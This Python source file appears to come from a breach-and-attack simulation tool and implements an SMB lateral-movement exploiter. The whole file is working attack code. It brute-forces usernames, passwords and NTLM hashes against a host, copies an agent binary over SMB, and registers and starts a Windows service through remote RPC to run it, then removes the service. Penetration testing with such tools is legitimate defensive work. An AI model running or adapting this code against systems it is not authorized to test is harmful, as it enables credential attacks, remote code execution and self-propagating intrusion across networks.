from dataclasses import dataclass
from logging import getLogger
from pathlib import PurePath
from time import time
from typing import Optional, Tuple

from impacket.dcerpc.v5 import scmr, transport
from impacket.dcerpc.v5.rpcrt import DCERPC_v5
from impacket.dcerpc.v5.scmr import DCERPCSessionError

from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.credentials import get_plaintext
from common.tags import (
    T1021_ATTACK_TECHNIQUE_TAG,
    T1105_ATTACK_TECHNIQUE_TAG,
    T1110_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
    T1569_ATTACK_TECHNIQUE_TAG,
)
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.smb_tools import SmbTools
from infection_monkey.model import DROPPER_CMDLINE_DETACHED_WINDOWS, MONKEY_CMDLINE_DETACHED_WINDOWS
from infection_monkey.utils.brute_force import (
    generate_brute_force_combinations,
    get_credential_string,
)
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.threading import interruptible_iter

logger = getLogger(__name__)
SMBEXEC_EXPLOITER_TAG = "smbexec-exploiter"


@dataclass
class SelectedCredentials:
    user: str
    password: str
    lm_hash: str
    ntlm_hash: str


class SMBExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "SMB"
    KNOWN_PROTOCOLS = {
        "139/SMB": (r"ncacn_np:%s[\pipe\svcctl]", 139),
        "445/SMB": (r"ncacn_np:%s[\pipe\svcctl]", 445),
    }
    USE_KERBEROS = False
    SMB_SERVICE_NAME = "InfectionMonkey"
    _EXPLOITER_TAGS = (
        SMBEXEC_EXPLOITER_TAG,
        T1021_ATTACK_TECHNIQUE_TAG,
        T1110_ATTACK_TECHNIQUE_TAG,
        T1210_ATTACK_TECHNIQUE_TAG,
    )
    _PROPAGATION_TAGS = (
        SMBEXEC_EXPLOITER_TAG,
        T1021_ATTACK_TECHNIQUE_TAG,
        T1105_ATTACK_TECHNIQUE_TAG,
        T1210_ATTACK_TECHNIQUE_TAG,
        T1569_ATTACK_TECHNIQUE_TAG,
    )

    def _exploit_host(self):

        dest_path = get_agent_dst_path(self.host)
        remote_full_path, creds, timestamp = self._exploit(dest_path)

        if not self.exploit_result.exploitation_success:
            if not self._is_interrupted():
                logger.debug("Exploiter SmbExec is giving up...")
                self.exploit_result.error_message = "Failed to authenticate to the victim over SMB"

            return self.exploit_result

        # execute the remote dropper in case the path isn't final
        cmdline = self._get_agent_command(remote_full_path, dest_path)

        scmr_rpc = self._get_rpc_connection(creds)

        if not scmr_rpc:
            error_message = "Failed to establish an RPC connection over SMB"

            self._publish_propagation_event(timestamp, False, error_message=error_message)

            logger.warning(error_message)
            self.exploit_result.error_message = error_message

            return self.exploit_result

        if not self._run_agent_on_victim(scmr_rpc, cmdline, timestamp):
            return self.exploit_result

        logger.info(
            "Executed monkey '%s' on remote victim %r (cmdline=%r)",
            remote_full_path,
            self.host,
            cmdline,
        )
        self.exploit_result.propagation_success = True

        self.add_vuln_port(
            "%s or %s"
            % (
                SMBExploiter.KNOWN_PROTOCOLS["139/SMB"][1],
                SMBExploiter.KNOWN_PROTOCOLS["445/SMB"][1],
            )
        )
        return self.exploit_result

    def _exploit(
        self, dest_path: PurePath
    ) -> Tuple[Optional[str], Optional[SelectedCredentials], Optional[float]]:
        agent_binary = self.agent_binary_repository.get_agent_binary(self.host.operating_system)

        creds = list(generate_brute_force_combinations(self.options["credentials"]))
        if len(creds) == 0:
            error_message = "SMB exploiter not attempted since no credentials were provided"
            logger.error(error_message)
            self._publish_exploitation_event(
                time=time(),
                success=False,
                error_message=error_message,
            )
            return None, None, None

        remote_full_path = None
        for user, password, lm_hash, ntlm_hash in interruptible_iter(creds, self.interrupt):
            creds_for_log = get_credential_string([user, password, lm_hash, ntlm_hash])

            timestamp = time()
            try:
                # copy the file remotely using SMB
                remote_full_path = SmbTools.copy_file(
                    self.host,
                    agent_binary,
                    dest_path,
                    user,
                    password,
                    lm_hash,
                    ntlm_hash,
                    self.options["smb_download_timeout"],
                )

                if remote_full_path is not None:
                    logger.info(
                        f"Successfully logged in to {self.host.ip} using SMB "
                        f"with {creds_for_log}"
                    )
                    self.report_login_attempt(True, user, password, lm_hash, ntlm_hash)
                    self.add_vuln_port(
                        "%s or %s"
                        % (
                            SMBExploiter.KNOWN_PROTOCOLS["139/SMB"][1],
                            SMBExploiter.KNOWN_PROTOCOLS["445/SMB"][1],
                        )
                    )
                    self._publish_exploitation_event(timestamp, True)
                    self.exploit_result.exploitation_success = True
                    break
                else:
                    # failed exploiting with this user/pass
                    self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                    error_message = f"Failed to login using SMB with {creds_for_log}"
                    self._publish_exploitation_event(timestamp, False, error_message=error_message)

            except Exception as exc:
                error_message = (
                    f"Error while trying to copy file using SMB to {self.host.ip} with "
                    f"{creds_for_log}:{exc}"
                )
                logger.error(error_message)
                self._publish_exploitation_event(timestamp, False, error_message=error_message)
                continue

        return remote_full_path, SelectedCredentials(user, password, lm_hash, ntlm_hash), timestamp

    def _get_agent_command(self, remote_full_path: str, dest_path: PurePath) -> str:
        if remote_full_path.lower() != str(dest_path).lower():
            cmdline = DROPPER_CMDLINE_DETACHED_WINDOWS % {
                "dropper_path": remote_full_path
            } + build_monkey_commandline(
                self.servers,
                self.current_depth + 1,
                str(dest_path),
            )
        else:
            cmdline = MONKEY_CMDLINE_DETACHED_WINDOWS % {
                "monkey_path": remote_full_path
            } + build_monkey_commandline(self.servers, self.current_depth + 1)

        return cmdline

    def _get_rpc_connection(self, creds: SelectedCredentials) -> Optional[DCERPC_v5]:
        for str_bind_format, port in SMBExploiter.KNOWN_PROTOCOLS.values():
            rpctransport = transport.DCERPCTransportFactory(str_bind_format % (self.host.ip,))
            rpctransport.set_connect_timeout(LONG_REQUEST_TIMEOUT)
            rpctransport.set_dport(port)
            rpctransport.setRemoteHost(str(self.host.ip))
            if hasattr(rpctransport, "set_credentials"):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(
                    creds.user,
                    get_plaintext(creds.password),
                    "",
                    get_plaintext(creds.lm_hash),
                    get_plaintext(creds.ntlm_hash),
                    None,
                )
            rpctransport.set_kerberos(SMBExploiter.USE_KERBEROS)

            scmr_rpc = rpctransport.get_dce_rpc()

            try:
                scmr_rpc.connect()
            except Exception as exc:
                logger.debug(
                    f"Can't connect to SCM on exploited machine {self.host}, port {port} : "
                    f"{exc}"
                )
                continue

            logger.debug(f"Connected to SCM on exploited machine {self.host}, port {port}")
            smb_conn = rpctransport.get_smb_connection()
            smb_conn.setTimeout(LONG_REQUEST_TIMEOUT)
            if smb_conn is None:
                return None

            return scmr_rpc

        return None

    def _run_agent_on_victim(self, scmr_rpc: DCERPC_v5, cmdline: str, start_time: float) -> bool:
        scmr_rpc.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(scmr_rpc)
        sc_handle = resp["lpScHandle"]

        try:
            resp = scmr.hRCreateServiceW(
                scmr_rpc,
                sc_handle,
                SMBExploiter.SMB_SERVICE_NAME,
                SMBExploiter.SMB_SERVICE_NAME,
                lpBinaryPathName=cmdline,
            )
        except DCERPCSessionError as err:
            if err.error_code == 0x431:
                logger.debug(f'SMB service "{SMBExploiter.SMB_SERVICE_NAME}" already exists')
                resp = scmr.hROpenServiceW(scmr_rpc, sc_handle, SMBExploiter.SMB_SERVICE_NAME)
            else:
                self.exploit_result.error_message = str(err)
                self._publish_propagation_event(start_time, False, error_message=str(err))
                return False

        service = resp["lpServiceHandle"]
        try:
            scmr.hRStartServiceW(scmr_rpc, service)
            self._publish_propagation_event(start_time, True)
        except Exception:
            error_message = "Failed to start the service"
            self._publish_propagation_event(start_time, False, error_message=error_message)

        scmr.hRDeleteService(scmr_rpc, service)
        scmr.hRCloseServiceHandle(scmr_rpc, service)

        return True
